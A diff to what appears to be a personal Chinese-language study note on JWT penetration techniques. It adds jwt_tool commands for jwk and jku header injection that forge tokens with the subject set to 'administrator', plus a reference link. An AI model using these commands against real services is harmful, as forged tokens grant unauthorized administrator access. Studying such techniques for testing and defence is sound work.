@@ -68,8 +68,16 @@ alg被设置为"None"，表示不使用签名。这意味着任何令牌都会�
 ## 4.2 暴力破解密钥
 也就是利用上面说的工具对jwt加密存在弱密钥的时候，可以破解密钥，从而伪造jwt签名。
 ## 4.3 JWT头参数注入
-直接在jwt头部注入自己的密钥，让服务器使用我们写的密钥进行验证
-（没怎么看懂）
+1. jwk注入，直接在jwt头部注入自己的密钥，让服务器使用我们写的密钥进行验证
+（没怎么看懂）,可以用工具直接生成jwt，
+```bash
+python jwt_tool.py jwt -I -pc sub -pv administrator -hc kid -hv jwt_tool -X i
+```
+2. jku注入，这是从url中获取密钥的，
+ ```bash
+python jwt_tool.py jwt -I -pc sub -pv administrator -hc kid -hv jwt_tool -X s -ju url
+```
+   
 ## 4.4 JWT 算法混淆
 1. 逻辑混淆绕过JWT算法`（暴露公钥情况）`
 ```txt
@@ -92,3 +100,6 @@ alg被设置为"None"，表示不使用签名。这意味着任何令牌都会�
 ```
 
 ```
+
+
+`参考文章`：[JSON Web Token (JWT) 渗透技巧【详解总结】 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/425450.html)
